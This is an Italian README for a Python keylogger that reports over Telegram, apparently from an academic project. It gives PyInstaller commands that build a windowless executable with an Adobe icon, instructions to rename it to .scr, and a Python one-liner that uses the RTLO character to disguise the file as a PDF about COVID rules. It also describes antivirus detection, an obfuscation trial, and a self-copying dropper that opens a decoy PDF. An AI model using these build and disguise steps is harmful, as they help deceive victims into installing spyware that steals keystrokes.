# telegram-python-keylogger

Per ottenere l'eseguibile dai sorgenti con Pyinstaller (che deve essere installato sul proprio computer) si può eseguire il comando
pyinstaller.exe .\main_moduli.spec

Se si desidera non usare il file .spec già pronto si può usare il comando completo
pyinstaller.exe --onefile --icon=adobe-icon.ico --noconsole .\main_moduli.py

Nel primo caso si ottiene il file con l'extension proofing già applicato. In entrambi i casi l'eseguibile è però in formato .exe e va quindi rinominato dandogli l'estensione .scr . Se si rinomina il file contenente già il carattere RTLO bisogna porre attenzione all'ordine delle lettere, che devono apparire in ordine inverso.

Per rinominare il file è anche possibile aprire una console Python e digitare la seguente riga:
import os;os.rename('main_moduli.exe', 'Nuove norme covid\u202Efdp.scr')

************************

Aprire l'eseguibile solo su una macchina virtuale sprovvista di antivirus, alcuni antivirus (AVG ad esempio) si accorgono della natura malevola del file e lo spostano automaticamente in quarantena all'apertura

************************

Nella cartella "Utilities and improvements" ci sono script per pulire i registri di Windows ed alcune prove relative ai potenziali miglioramenti presentati nella relazione

- Nella cartella "Utilities and improvements\Semplice offuscamento codice" si trova una prova di offuscamento fatta con una versione obsoleta del keylogger privata di molte sue parti

- Nella cartella "Utilities and improvements\Scrittura ed apertura del PDF reale" c'è un esempio di codice che verifica se si tratta della versione originale o della copia ed in base a quello agisce in maniera simile a quanto descritto nella relazione: se è l'originale, crea la copia di sé, crea un file PDF (leggendo al volo il bytearray dall'originale per comodità in modo da non avere un lunghissimo bytearray nel codice), avvia entrambi; se non è l'originale invece si limita a stampare in console 10 volte "Già fatto {counter}". Il codice è funzionante, al netto del cambiare i path assoluti e, se necessario, dell'integrare nel comando di avvio della copia l'equivalente Windows del comando nohup esistente in ambiente Linux.